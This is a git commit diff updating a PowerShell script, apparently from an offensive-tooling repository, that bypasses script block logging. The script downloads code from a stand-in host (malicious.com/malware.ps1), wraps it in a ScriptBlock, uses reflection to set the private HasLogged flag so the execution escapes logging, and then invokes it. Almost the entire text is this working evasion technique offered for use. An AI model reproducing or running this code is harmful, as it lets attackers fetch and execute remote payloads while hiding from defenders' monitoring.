b3599cc1c2a22b11f709f32d8cf14ec1377f0fd8
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-08-06 18:54:57 +0200

    Update ScriptBlockLogbypass.ps1

--- PowershellScripts/ScriptBlockLogbypass.ps1
+++ PowershellScripts/ScriptBlockLogbypass.ps1
@@ -1,9 +1,10 @@
 # technique from https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
 
 # This script is not logged yet because its not executed
-$script = (New-Object Net.WebClient).DownloadString('https://url/maliciousscript.ps1')
+$script = (New-Object Net.WebClient).DownloadString('https://malicious.com/malware.ps1')
+$scriptBlock = [ScriptBlock]::create($script)
 # Set the HasLogged value to true, so that it's not "logged again"
-[ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($script, $true)
+[ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($scriptBlock, $true)
 
 # Invoke it, this will not get logged
-$script.invoke()
+$scriptBlock.invoke()
